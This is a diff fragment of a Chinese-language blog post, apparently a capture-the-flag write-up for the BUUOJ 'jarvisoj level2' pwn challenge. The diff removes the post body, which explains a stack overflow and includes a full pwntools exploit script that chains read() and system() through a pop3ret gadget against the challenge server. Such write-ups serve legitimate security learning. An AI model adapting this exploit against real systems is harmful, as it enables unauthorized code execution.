-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/buu/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p><img src="/2021/06/16/buu-jarvisoj-level2/main.png"></p>
-<p><img src="/2021/06/16/buu-jarvisoj-level2/vulnerable.png"></p>
-<p>函数vulnerable_function()中存在明显的溢出点，可调用read函数和system函数</p>
-<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
-<li>劫持返回地址到read()函数，向bss段写入要执行的指令字符串(cat flag)</li>
-<li>read()函数返回到system()函数，执行指令获得flag</li>
-</ol>
-<p>要想在执行完read函数后再执行system并且控制system函数的参数，就要在read函数执行完之后将栈中的参数弹出并执行返回指令以再次控制程序执行流程。这需要```pop三个寄存器 ret``的指令</p>
-<p><img src="/2021/06/16/buu-jarvisoj-level2/gadget.png"></p>
-<p>查看bss段的地址</p>
-<p><img src="/2021/06/16/buu-jarvisoj-level2/bss.png"></p>
-<p>查看此地址区间的保护属性</p>
-<p><img src="/2021/06/16/buu-jarvisoj-level2/vmmap.png"></p>
-<blockquote>
-<p>可写</p>
-</blockquote>
-<h3 id="了解一下read-函数"><a href="#了解一下read-函数" class="headerlink" title="了解一下read()函数"></a>了解一下read()函数</h3><p>read()的原型为</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size_t <span class="built_in">read</span>(int fildes, void *buf, size_t nbytes);</span><br></pre></td></tr></table></figure>
-
-<p>read系统调用的作用是从与文件描述符相关的文件里读入nbytes个字节的数据，并把它们放到数据区buf中，返回读入的字节数，失败时返回-1。</p>
-<p>当文件描述符为0时，从标准输入读取数据。</p>
-<h3 id="了解一下system"><a href="#了解一下system" class="headerlink" title="了解一下system()"></a>了解一下system()</h3><p>system()原型</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int system(const char *<span class="built_in">command</span>);</span><br></pre></td></tr></table></figure>
-
-<p>如果无法启动shell运行命令，system将返回127；出现不能执行system调用的其他错误时返回-1。如果system能够顺利执行，返回那个命令的退出码。</p>
-<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># sh=process(&quot;./level2&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29998</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./level2&quot;</span>)</span><br><span class="line">pop3ret=<span class="number">0x08048519</span></span><br><span class="line">read=elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x0804A000</span> <span class="comment">#地址取了个整</span></span><br><span class="line">start=<span class="number">0x08048350</span></span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">136</span>+<span class="string">&quot;aaaa&quot;</span>+p32(read)+p32(pop3ret)+p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">9</span>)+p32(system)+p32(<span class="number">0</span>)+p32(bss)</span><br><span class="line"><span class="comment"># gdb.attach(sh,&quot;b *0x8048480&quot;)</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
 
       
     </div>
@@ -1328,20 +1345,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">18</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">17</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
